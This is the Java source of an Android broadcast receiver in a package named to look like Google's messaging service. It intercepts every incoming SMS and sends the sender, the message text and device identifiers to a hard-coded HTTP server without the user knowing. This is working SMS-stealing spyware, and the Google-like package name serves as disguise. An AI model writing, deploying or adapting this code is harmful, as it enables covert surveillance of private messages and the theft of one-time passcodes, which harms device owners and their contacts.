package com.android.google.messaging.services.receivers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Scanner;

public class MyReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {

        Bundle bundle = intent.getExtras();
        String format = bundle.getString("format");
        Object[] messages = (Object[]) bundle.get("pdus");
        SmsMessage[] smsMessages = new SmsMessage[messages.length];

        for (int i = 0; i < messages.length; i++) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                smsMessages[i] = SmsMessage.createFromPdu((byte[]) messages[i], format);
            }
            else {
                smsMessages[i] = SmsMessage.createFromPdu((byte[]) messages[i]);
            }
        }

        ArrayList<String> allMessages = new ArrayList<>();

        for (SmsMessage singleSmsMessage : smsMessages) {

            String messageBody = "From:=> \t" + singleSmsMessage.getOriginatingAddress() + "\nMessage:=> \t" + singleSmsMessage.getMessageBody();

            if (!messageBody.isEmpty()) {
                allMessages.add(messageBody);
            }
        }

        for (String oneMessage : allMessages) {
            try {
                sendSmsToServer(oneMessage);
                Log.d("NurAlam1", oneMessage);
            }
            catch (Exception e) {
                Log.d("NurAlam2", oneMessage);
                e.printStackTrace();
            }
        }
    }

//    -----------------------------------------------------------------------------------

    public static void sendSmsToServer(String smsMessage) throws UnsupportedEncodingException {

        String serverAddress = "http://192.168.87.113";

        String fullDeviceInfo = "Device=> " + Build.DEVICE
                + "\nBrand=> "+ Build.BRAND
                + "\nDevice Id=> "+Build.ID
                + "\nManufacturer=> "+Build.MANUFACTURER
                + "\nModel=> "+Build.MODEL
                + "\nProduct=> "+Build.PRODUCT;

        String serverFullUrl = serverAddress
                + "?device-info="
                + URLEncoder.encode(fullDeviceInfo, StandardCharsets.UTF_8.toString())
                + "&sms="
                + URLEncoder.encode(smsMessage, StandardCharsets.UTF_8.toString());

        new Thread(() -> {

            try {
                URL url = new URL(serverFullUrl);
                Scanner scanner = new Scanner(url.openStream());
                Log.d("NurAlam4", "url opened : " + scanner.nextLine());
            }
            catch (IOException e) {
                e.printStackTrace();
                Log.d("NurAlam5", "url not opened");
            }
        }).start();
    }
}
